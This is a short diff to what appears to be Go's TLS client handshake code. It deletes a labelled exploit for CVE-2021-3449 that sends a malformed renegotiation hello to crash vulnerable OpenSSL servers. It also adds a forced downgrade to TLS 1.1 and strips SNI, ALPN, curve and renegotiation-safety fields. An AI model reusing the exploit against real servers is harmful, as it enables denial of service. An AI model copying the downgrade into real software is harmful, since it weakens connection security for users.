@@ -62,19 +62,12 @@ func (c *Conn) makeClientHello() (*clientHelloMsg, error) {
 		clientHelloVersion = VersionTLS12
 	}
 
+	clientHelloVersion = VersionTLS11	// Pixel 5a emulation
 	hello := &clientHelloMsg{
 		vers:                         clientHelloVersion,
-		compressionMethods:           []uint8{compressionNone},
 		random:                       make([]byte, 32),
+		compressionMethods:           []uint8{compressionNone},
 		sessionId:                    make([]byte, 32),
-		ocspStapling:                 true,
-		scts:                         true,
-		serverName:                   hostnameInSNI(config.ServerName),
-		supportedCurves:              config.curvePreferences(),
-		supportedPoints:              []uint8{pointFormatUncompressed},
-		secureRenegotiationSupported: true,
-		alpnProtocols:                config.NextProtos,
-		supportedVersions:            supportedVersions,
 	}
 
 	if c.handshakes > 0 {
@@ -109,20 +102,6 @@ func (c *Conn) makeClientHello() (*clientHelloMsg, error) {
 	// a compatibility measure (see RFC 8446, Section 4.1.2).
 	if _, err := io.ReadFull(config.rand(), hello.sessionId); err != nil {
 		return nil, errors.New("tls: short read from Rand: " + err.Error())
-	}
-
-	// CVE-2021-3449 exploit code.
-	if hello.vers >= VersionTLS12 {
-		if c.handshakes == 0 {
-			println("sending initial ClientHello")
-			hello.supportedSignatureAlgorithms = supportedSignatureAlgorithms
-		} else {
-			// OpenSSL pre-1.1.1k runs into a NULL-pointer dereference
-			// if the supported_signature_algorithms extension is omitted,
-			// but supported_signature_algorithms_cert is present.
-			println("sending malicious ClientHello")
-			hello.supportedSignatureAlgorithmsCert = supportedSignatureAlgorithms
-		}
 	}
 
 	return hello, nil
